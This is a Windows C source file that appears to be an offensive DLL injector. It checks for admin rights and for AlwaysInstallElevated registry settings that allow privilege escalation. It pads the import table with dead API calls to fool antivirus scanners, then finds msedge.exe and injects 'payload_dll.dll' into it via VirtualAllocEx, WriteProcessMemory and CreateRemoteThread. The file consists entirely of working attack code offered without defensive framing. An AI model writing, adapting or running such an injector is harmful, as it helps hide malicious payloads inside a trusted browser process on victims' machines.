#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>

// Function to check if the process is running with admin privileges
BOOL IsRunningAsAdmin() {
	BOOL isAdmin = FALSE;
	PSID adminGroup = NULL;

	// Allocate and initialize a SID for the administrators group.
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
		printf("[!] AllocateAndInitializeSid Failed With Error Code: %d\n", GetLastError());
		return FALSE;
	}

	// Check if the token of the calling thread is a member of the administrators group.
	if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
		printf("[!] CheckTokenMembership Failed With Error Code: %d\n", GetLastError());
		isAdmin = FALSE;
	}

	// Free the SID.
	if (adminGroup) {
		FreeSid(adminGroup);
	}

	return isAdmin;
}

// Fucntion to check whether HKCU AlwaysInstallElevated is enabled
BOOL CheckHKCUAlwaysInstallElevated(){
	HKEY        hKey = NULL;
	BOOL        bResult = FALSE;
	LSTATUS     STATUS = 0x00;
	DWORD       dwKeyValue = 0x01,
		dwKeyValueSize = sizeof(DWORD);
	
	//Open the registry key to check the value of AlwaysInstallElevated
	if ((STATUS = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\Installer", 0, KEY_QUERY_VALUE, &hKey)) != ERROR_SUCCESS) {
		goto _END_OF_FUNC;
	}

	//Query the value of AlwaysInstallElevated
	if ((STATUS = RegQueryValueExW(hKey, L"AlwaysInstallElevated", NULL, NULL, &dwKeyValue, &dwKeyValueSize)) != ERROR_SUCCESS) {
		printf("[!] RegQueryValueEx Failed With Error: %d\n", STATUS);
		goto _END_OF_FUNC;
	}

	//Check if the value is set to 1
	if (dwKeyValue == 1) {
		bResult = TRUE;
	}

_END_OF_FUNC:
	if (hKey)
		RegCloseKey(hKey);
	return bResult;

}

// Function to check whether HKLM AlwaysInstallElevated is enabled
BOOL CheckHKLMAlwaysInstallElevated() {
	HKEY        hKey = NULL;
	BOOL        bResult = FALSE;
	LSTATUS     STATUS = 0x00;
	DWORD       dwKeyValue = 0x01,
		dwKeyValueSize = sizeof(DWORD);

	// Open the registry key to check the value of AlwaysInstallElevated
	if ((STATUS = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Policies\\Microsoft\\Windows\\Installer", 0, KEY_QUERY_VALUE, &hKey)) != ERROR_SUCCESS) {
		goto _END_OF_FUNC;
	}

	//Query the value of AlwaysInstallElevated
	if ((STATUS = RegQueryValueExW(hKey, L"AlwaysInstallElevated", NULL, NULL, &dwKeyValue, &dwKeyValueSize)) != ERROR_SUCCESS) {
		printf("[!] RegQueryValueEx Failed With Error: %d\n", STATUS);
		goto _END_OF_FUNC;
	}

	//Check if the value is set to 1
	if (dwKeyValue == 1) {
		bResult = TRUE;
	}

_END_OF_FUNC:
	if (hKey)
		RegCloseKey(hKey);
	return bResult;

}

// Function to add Whitelisted APIs to camouflage IAT
VOID IATCamoflage2() {
	ULONG_PTR uAddress = NULL;

	if (!(uAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100))) {
		return;
	}

	if (((uAddress >> 8) & 0xFF) > 0xFFFF) {
		RegCloseKey(NULL);
		RegDeleteKeyExA(NULL, NULL, NULL, NULL);
		RegDeleteKeyExW(NULL, NULL, NULL, NULL);
		RegEnumKeyExA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegEnumValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegGetValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		RegisterServiceCtrlHandlerA(NULL, NULL);
		RegisterServiceCtrlHandlerW(NULL, NULL);
	}

	if (!HeapFree(GetProcessHeap(), 0x00, uAddress)) {
		return;
	}
}

// Function to enumerate processes and get the handle of the remote process
BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessID, OUT HANDLE* hProcess) {

	// Initialize the process entry structure
	PROCESSENTRY32 Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	HANDLE hSnapShot = NULL;

	// Get the snapshot of the processes
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error Code: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	//Read First Process
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error Code: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	//Read The Remaining Processes
	do {
		// If the process name matches the required process name
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			// Get the process ID
			*dwProcessID = Proc.th32ProcessID;
			//Open a handle to the process
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessID);
			if (*hProcess == NULL) {
				printf("[!] OpenProcess Failed With Error Code: %d\n", GetLastError());
			}
			break;
		}
	} while (Process32Next(hSnapShot, &Proc));

	// Close the handle to the snapshot
_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessID == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

//Function to inject the payload into the remote process
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
	BOOL		bSTATE = TRUE;
	LPVOID		pLoadLibraryW = NULL;
	LPVOID		pAddress = NULL;

	// fetching the size of DllName in bytes
	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	SIZE_T		lpNumberOfBytesWritten = NULL;
	HANDLE		hThread = NULL;

    // Load LoadLibraryW WinAPI Function by opening a handle to kernel32.dll
	//Opening a handle to kernel32.dll
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    if (hKernel32 == NULL) {
        printf("[!] GetModuleHandle Failed With Error Code: %d\n", GetLastError());
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

	// Get the address of LoadLibraryW and loading it
    pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        printf("[!] GetProcAddress Failed With Error Code: %d\n", GetLastError());
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

	//Allocate Memory in the remote process to store the Dll Name
	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error Code: %d\n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d Bytes\n", pAddress, dwSizeToWrite);

	//Write the Dll Name to the allocated memory
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)) {
		printf("[!] WriteProcessMemory Failed With Error Code: %d\n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	printf("[i] Successfully Written %lld Bytes\n", lpNumberOfBytesWritten);
	printf("[i] Dll Name Written To The Remote Process\n");

	printf("[i] Executing Payload ...\n");
	printf("[+] Creating Remote Thread To Load The Dll\n");

	//Executing the payload by creating a new remote thread
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error Code: %d\n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	printf("[+] Remote Thread Created Successfully\n");

_EndOfFunction:
	if (hThread) {
		CloseHandle(hThread);
	}
	return bSTATE;

}

int main() {

	// Checking if the program is running with admin privileges
	if (IsRunningAsAdmin()) {
		printf("[+] The program is running with admin privileges.\n");
	}
	else {
		if (!(CheckHKCUAlwaysInstallElevated() || CheckHKLMAlwaysInstallElevated())) {
			printf("[!] The program is not running with admin privileges.\n");
			printf("[i] AlwaysInstallElevated is not enabled in the registry\n");
		}
		
	}

	// Camoflage the IAT
	IATCamoflage2();

	// Hardcoded process name
	wchar_t szProcessName[] = L"msedge.exe";

	// Get the current location of the binary
	wchar_t szCurrentPath[MAX_PATH];
	DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
	if (length == 0) {
		printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
		return -1;
	}

	// Remove the executable name from the path
	wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
	if (lastSlash != NULL) {
		*lastSlash = L'\0';
	}

	// Append the DLL name to the path
	wchar_t szDllPath[MAX_PATH];
	swprintf(szDllPath, MAX_PATH, L"%s\\payload_dll.dll", szCurrentPath);

	DWORD dwProcessID;
	HANDLE hProcess;

	// Get the handle of the target remote process
	if (!GetRemoteProcessHandle(szProcessName, &dwProcessID, &hProcess)) {
		printf("[!] Failed to get handle of the target process\n");
		return -1;
	}

	printf("[*] Got handle of the target process with PID: %d\n", dwProcessID);

	// Inject the DLL into the remote process
	if (!InjectDllToRemoteProcess(hProcess, szDllPath)) {
		printf("[!] Failed to inject DLL into the target process\n");
		CloseHandle(hProcess);
		return -1;
	}

	printf("[+] DLL injected successfully\n");

	// Close the handle to the process
	CloseHandle(hProcess);

	return 0;
}
